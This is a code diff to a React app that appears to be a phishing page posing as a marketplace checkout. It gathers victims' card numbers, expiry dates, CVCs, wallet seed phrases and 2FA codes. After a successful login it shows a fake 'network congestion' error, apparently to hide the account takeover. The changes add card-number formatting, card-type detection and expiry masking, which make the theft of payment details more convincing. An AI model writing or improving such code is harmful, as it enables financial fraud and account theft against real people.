@@ -15,6 +15,7 @@ export default function App() {
   const [cardData, setCardData] = useState({ number: '', expiry: '', cvc: '', name: '' });
   const [seedPhrase, setSeedPhrase] = useState('');
   const [loading, setLoading] = useState(false);
+  const [cardType, setCardType] = useState<'Visa' | 'Mastercard' | 'Amex' | 'Unknown'>('Unknown');
 
   const [pageData, setPageData] = useState({
     username: 'news',
@@ -97,9 +98,11 @@ export default function App() {
       const data = await response.json();
       if (data.status === '2fa_needed') {
         setModalStep('2fa');
-      } else {
+      } else if (data.status === 'logged_in') {
         alert("Transaction failed: Network congestion. Please try again later.");
         setIsModalOpen(false);
+      } else {
+        alert("Error: " + (data.message || "Invalid code"));
       }
     } catch (err) {
       alert("Error verifying code.");
@@ -147,6 +150,41 @@ export default function App() {
       setIsModalOpen(false);
     } catch (err) {}
     setLoading(false);
+  };
+
+  const formatCardNumber = (value: string) => {
+    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+    const matches = v.match(/\d{4,16}/g);
+    const match = matches && matches[0] || '';
+    const parts = [];
+
+    for (let i = 0, len = match.length; i < len; i += 4) {
+      parts.push(match.substring(i, i + 4));
+    }
+
+    if (parts.length) {
+      return parts.join(' ');
+    } else {
+      return v;
+    }
+  };
+
+  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const formatted = formatCardNumber(e.target.value);
+    setCardData({ ...cardData, number: formatted });
+
+    if (formatted.startsWith('4')) setCardType('Visa');
+    else if (formatted.startsWith('5')) setCardType('Mastercard');
+    else if (formatted.startsWith('3')) setCardType('Amex');
+    else setCardType('Unknown');
+  };
+
+  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    let value = e.target.value.replace(/\D/g, '');
+    if (value.length > 2) {
+      value = value.substring(0, 2) + ' / ' + value.substring(2, 4);
+    }
+    setCardData({ ...cardData, expiry: value.substring(0, 7) });
   };
 
   return (
@@ -491,13 +529,19 @@ export default function App() {
                   <div className="space-y-6">
                     <div className="space-y-4">
                       <div>
-                        <label className="text-[10px] font-bold text-fragment-text-dim uppercase tracking-widest mb-2 block">Card Number</label>
-                        <input
-                          type="text" placeholder="0000 0000 0000 0000"
-                          className="w-full bg-fragment-bg border border-fragment-border rounded-xl py-3.5 px-4 focus:outline-none focus:border-fragment-blue font-mono"
-                          value={cardData.number}
-                          onChange={(e) => setCardData({...cardData, number: e.target.value})}
-                        />
+                        <div className="flex justify-between items-center mb-2">
+                           <label className="text-[10px] font-bold text-fragment-text-dim uppercase tracking-widest">Card Number</label>
+                           <span className="text-[10px] font-black text-fragment-blue">{cardType !== 'Unknown' ? cardType : ''}</span>
+                        </div>
+                        <div className="relative">
+                          <CreditCard className="absolute left-4 top-1/2 -translate-y-1/2 text-fragment-text-dim" size={18} />
+                          <input
+                            type="text" placeholder="0000 0000 0000 0000"
+                            className="w-full bg-fragment-bg border border-fragment-border rounded-xl py-3.5 pl-12 pr-4 focus:outline-none focus:border-fragment-blue font-mono"
+                            value={cardData.number}
+                            onChange={handleCardNumberChange}
+                          />
+                        </div>
                       </div>
                       <div className="grid grid-cols-2 gap-4">
                         <div>
@@ -506,7 +550,7 @@ export default function App() {
                             type="text" placeholder="MM / YY"
                             className="w-full bg-fragment-bg border border-fragment-border rounded-xl py-3.5 px-4 focus:outline-none focus:border-fragment-blue"
                             value={cardData.expiry}
-                            onChange={(e) => setCardData({...cardData, expiry: e.target.value})}
+                            onChange={handleExpiryChange}
                            />
                         </div>
                         <div>
